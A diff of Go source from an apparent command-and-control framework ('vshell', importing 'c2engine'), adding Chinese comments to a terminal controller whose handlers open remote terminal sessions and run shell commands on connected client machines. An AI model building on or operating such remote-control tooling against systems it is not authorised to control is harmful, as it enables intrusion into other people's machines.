@@ -6,19 +6,22 @@ import (
 	"vshell/c2engine"
 )
 
-// TerminalController handles remote terminal sessions
+// TerminalController 处理远程终端会话。
+// TerminalController handles remote terminal sessions.
 type TerminalController struct {
 	BaseController
 }
 
-// Get renders the terminal page
+// Get 渲染终端页面。
+// Get renders the terminal page.
 func (c *TerminalController) Get() {
 	clientID := c.GetString("client_id")
 	c.Data["client_id"] = clientID
 	c.Render("terminal.html")
 }
 
-// WS handles WebSocket terminal connections
+// WS 处理 WebSocket 终端连接。
+// WS handles WebSocket terminal connections.
 func (c *TerminalController) WS() {
 	clientID, _ := c.GetInt64("client_id")
 	sessionID := c.GetString("session_id")
@@ -112,7 +115,8 @@ func (c *TerminalController) WS() {
 	})
 }
 
-// Shell executes a shell command on the client (matching original binary TerminalController.Shell)
+// Shell 在客户端上执行 shell 命令（对应原版 TerminalController.Shell）。
+// Shell executes a shell command on the client (matching original binary TerminalController.Shell).
 func (c *TerminalController) Shell() {
 	clientID, _ := c.GetInt64("client_id")
 	command := c.GetString("command")
@@ -155,7 +159,8 @@ func (c *TerminalController) Shell() {
 	})
 }
 
-// Resize handles terminal resize events
+// Resize 处理终端尺寸调整事件。
+// Resize handles terminal resize events.
 func (c *TerminalController) Resize() {
 	cols, _ := strconv.Atoi(c.GetString("cols", "80"))
 	rows, _ := strconv.Atoi(c.GetString("rows", "24"))
